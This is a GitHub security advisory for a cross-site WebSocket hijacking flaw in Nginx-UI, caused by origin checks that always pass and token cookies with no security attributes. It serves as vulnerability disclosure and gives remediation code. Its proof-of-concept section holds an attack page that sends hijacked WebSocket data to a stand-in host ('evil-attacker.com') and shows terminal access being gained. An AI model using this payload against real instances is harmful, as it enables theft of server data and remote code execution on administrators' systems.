# [H] Nginx-UI: Cross-Site WebSocket Hijacking (CSWSH) via missing origin validation on all WebSocket endpoints

## Summary
Severity: High
Advisory: GHSA-78mf-482w-62qj
CVE: CVE-2026-34403
CWE: CWE-1385, CWE-352
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-21
Source: https://github.com/advisories/GHSA-78mf-482w-62qj
Type: github-advisory

## Affected
- Go: `github.com/0xJacky/Nginx-UI` — affected >=0 <1.9.10-0.20260316053337-1a9cd29a3082

## Details
## Summary

All WebSocket endpoints in nginx-ui use a gorilla/websocket Upgrader with CheckOrigin unconditionally returning true, allowing Cross-Site WebSocket Hijacking (CSWSH). Combined with the fact that authentication tokens are stored in browser cookies (set via JavaScript without HttpOnly or explicit SameSite attributes), a malicious webpage can establish authenticated WebSocket connections to the nginx-ui instance when a logged-in administrator visits the attacker-controlled page.

## Details

### Vulnerable Code Pattern

Every WebSocket endpoint in the codebase uses the same unsafe upgrader configuration:

```go
// Found in: api/terminal/pty.go, api/analytic/analytic.go, api/event/websocket.go,
// api/nginx_log/websocket.go, api/upstream/upstream.go, api/cluster/websocket.go,
// api/nginx/websocket.go, api/certificate/revoke.go, api/sites/websocket.go,
// api/llm/llm.go, api/llm/code_completion.go, api/system/upgrade.go
var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        return true // Accepts ALL origins
    },
}
```

### Cookie-Based Authentication

The Vue.js frontend stores JWT tokens as cookies without security attributes (app/src/pinia/moudule/user.ts):

```typescript
watch(token, v => {
    cookies.set('token', v, { maxAge: 86400 })  // No HttpOnly, no SameSite
})
```

The backend middleware accepts tokens from cookies (internal/middleware/middleware.go):

```go
func getToken(c *gin.Context) (token string) {
    // ...
    if token, _ = c.Cookie("token"); token != "" {
        return token
    }
    return ""
}
```

### Affected Endpoints

All WebSocket endpoints under the authenticated router group are vulnerable:

| Endpoint | Impact |
|---|---|
| /api/nginx/detail_status/ws | Leak nginx performance metrics and configuration |
| /api/events | Leak system processing events |
| /api/analytic/intro | Leak CPU, memory, disk, network statistics |
| /api/nginx_log | Read nginx log files (access/error logs) |
| /api/pty | Interactive terminal access (RCE if OTP not enabled) |
| /api/upgrade/perform | Trigger system binary upgrade |
| /api/cluster/nodes/enabled | Leak and manipulate cluster node data |

## PoC

### Environment Setup

```yaml
services:
  nginx-ui:
    image: uozi/nginx-ui:latest
    ports:
      - "9000:80"
    volumes:
      - nginx-ui-config:/etc/nginx-ui
volumes:
  nginx-ui-config:
```

### Attack Page (hosted on attacker-controlled domain)

```html
<script>
// Attacker page at http://evil-attacker.com
// Victim must be logged into nginx-ui
const ws = new WebSocket('ws://TARGET_NGINX_UI:9000/api/nginx/detail_status/ws');
ws.onopen = () => console.log('CSWSH: Connected from malicious origin!');
ws.onmessage = (e) => {
    console.log('Stolen data:', e.data);
    fetch('https://evil-attacker.com/collect', {method:'POST', body: e.data});
};
</script>
```

### Automated PoC Results

```
[+] VULNERABLE! WebSocket connected from http://evil-attacker.com
[+] Received: {"stub_status_enabled":false,"running":true,"info":{"active":0,...}}

[+] VULNERABLE! Event stream from http://evil-attacker.com
[+] Received: {"event":"processing_status","data":{"index_scanning":false,...}}

[+] VULNERABLE! Analytics from http://evil-attacker.com
[+] Received: {"avg_load":{"load1":0.1,"load5":0.2},"cpu_percent":0.08,...}

[+] CRITICAL: Terminal connected from http://evil-attacker.com!
[+] Terminal output: 'eae7a76e3ef4 login: '
[*] Sent username: root
[+] Output: 'Password: '

[+] Control test (no auth): Correctly rejected with HTTP 403
```

## Impact

An attacker can create a malicious webpage that, when visited by an authenticated nginx-ui administrator, silently:

1. **Steals sensitive server information** -- nginx configuration, performance metrics, CPU/memory/disk usage, network traffic statistics, and system events
2. **Reads nginx log files** -- potentially containing sensitive request data, IP addresses, and authentication tokens
3. **Gains interactive terminal access** -- if the administrator has not enabled OTP/2FA, the attacker obtains a full PTY shell on the server, achieving Remote Code Execution
4. **Triggers system operations** -- including nginx reload/restart and binary upgrades

The attack requires no privileges and no knowledge of the victim's credentials. The only user interaction needed is visiting a webpage.

## Remediation

1. Implement proper origin validation in all WebSocket upgraders:

```go
var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        origin := r.Header.Get("Origin")
        return isAllowedOrigin(origin)
    },
}
```

2. Set secure cookie attributes:
```typescript
cookies.set('token', v, { maxAge: 86400, sameSite: 'strict', secure: true })
```

3. Add CSRF token validation to WebSocket upgrade requests as defense-in-depth.

A patch is available at https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.5

## References
- https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-78mf-482w-62qj
- https://nvd.nist.gov/vuln/detail/CVE-2026-34403
- https://github.com/0xJacky/nginx-ui
- https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.5
